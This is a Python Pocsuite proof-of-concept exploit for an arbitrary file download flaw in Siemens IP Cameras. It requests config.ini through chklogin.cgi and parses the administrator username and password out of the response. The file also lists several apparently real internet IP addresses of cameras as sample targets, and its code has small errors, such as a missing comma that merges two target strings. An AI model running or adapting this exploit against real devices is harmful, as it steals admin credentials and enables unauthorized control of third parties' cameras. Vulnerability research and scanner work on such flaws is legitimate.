#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Siemens IP Camera  Arbitrary File Download"
    vulID = ''
    author = ['sebao']
    vulType = 'File Download'
    version = '1.0'    # default version: 1.0
    references = ['https://cxsecurity.com/issue/WLB-2016090104']
    desc = '''Siemens IP Camera任意文件下载'''

    vulDate = ''
    createDate = '2017-6-30'
    updateDate = '2017-6-30'

    appName = 'Siemens IP Camera'
    appVersion = '0.1.69'
    appPowerLink = ''
    samples = ['https://78.56.240.235',
               'http://89.106.106.229:9001',
               'http: //85.183.42.87:81'
               'http://86.63.218.126:81'
               ]

    def _attack(self):
        return self._verify(self)



    def _verify(self):
        '''verify mode'''
        result = {}
        if self.url.endswith('/'):
            self.url = self.url[:-1]

        vul_url = "/cgi-bin/chklogin.cgi?file=config.ini"
        url = self.url + vul_url
        resp = req.get(url)
        if resp.status_code == 200 :
            if 'account.admin.user_id' in resp.content:
                rawstr = r'account.admin.user_id=(.*?)\naccount.admin.password=(.*?)\n'
                compile_obj = re.compile(rawstr)
                match_obj = compile_obj.search(resp.content)
                username = match_obj.group(1)
                password = match_obj.group(2)
            elif 'Adm_ID'in resp.content:
                rawstr1 = r'Adm_ID=(.*?)\nAdm_Pass1=(.*?)\n'
                compile_obj = re.compile(rawstr1)
                match_obj = compile_obj.search(resp.content)
                username = match_obj.group(1)
                password = match_obj.group(2)
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = username
            result['AdminInfo']['Password'] = password

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
